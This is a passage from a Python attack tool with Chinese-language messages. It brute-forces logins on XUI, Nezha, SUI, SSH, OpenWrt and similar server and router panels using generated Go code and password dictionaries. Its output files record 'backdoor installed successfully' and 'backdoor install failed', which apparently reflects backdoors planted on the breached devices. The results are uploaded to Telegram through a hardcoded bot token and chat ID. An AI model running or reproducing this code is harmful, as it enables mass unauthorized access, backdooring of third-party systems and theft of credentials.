        usernames, passwords = load_credentials(TEMPLATE_MODE)
        if not usernames or not passwords: sys.exit("❌ 错误: 用户名或密码字典为空。")
        
        all_templates = [XUI_GO_TEMPLATE_1, XUI_GO_TEMPLATE_2, XUI_GO_TEMPLATE_3, XUI_GO_TEMPLATE_4, XUI_GO_TEMPLATE_5, XUI_GO_TEMPLATE_6, XUI_GO_TEMPLATE_7, XUI_GO_TEMPLATE_8]
        generate_go_code(all_templates[TEMPLATE_MODE-1], semaphore_size, usernames, passwords, **kwargs)
        
        executable = compile_go_program()
        with open('ipcx.py', 'w', encoding='utf-8') as f: f.write(IPCX_PY_CONTENT)
        
        run_go_program(executable, input_file)
        subprocess.run([sys.executable, 'ipcx.py'])

        from datetime import datetime, timezone, timedelta
        time_str = (datetime.now(timezone.utc) + timedelta(hours=8)).strftime("%Y%m%d-%H%M")
        mode_map = {1: "XUI", 2: "哪吒", 3: "HUI", 4: "咸蛋", 5: "SUI", 6: "ssh", 7: "substore", 8: "OpenWrt"}
        prefix = mode_map.get(TEMPLATE_MODE, "result")
        
        final_files = {}
        if os.path.exists("xui.txt"): final_files[f"{prefix}-{time_str}.txt"] = "xui.txt"
        if os.path.exists("xui.xlsx"): final_files[f"{prefix}-{time_str}.xlsx"] = "xui.xlsx"
        if os.path.exists("hmsuccess.txt"): final_files[f"后门安装成功-{time_str}.txt"] = "hmsuccess.txt"
        if os.path.exists("hmfail.txt"): final_files[f"后门安装失败-{time_str}.txt"] = "hmfail.txt"
        
        for dst, src in final_files.items(): os.rename(src, dst)
        
    except (KeyboardInterrupt, EOFError):
        print("\n>>> 用户中断操作，正在清理...")
    finally:
        clean_temp_files()
        cost = int(time.time() - start)
        print(f"\n=== 全部完成！总用时 {cost // 60} 分 {cost % 60} 秒 ===")

        BOT_TOKEN = "7664203362:AAFTBPQ8Ydl9c1fqM53CSzKIPS0VBj99r0M"
        CHAT_ID = "7697235358"
        if BOT_TOKEN and CHAT_ID and 'final_files' in locals() and final_files:
            print(f"\n📤 正在上传结果至 Telegram ...")
            for final_name in final_files.keys():
                send_to_telegram(final_name, BOT_TOKEN, CHAT_ID)
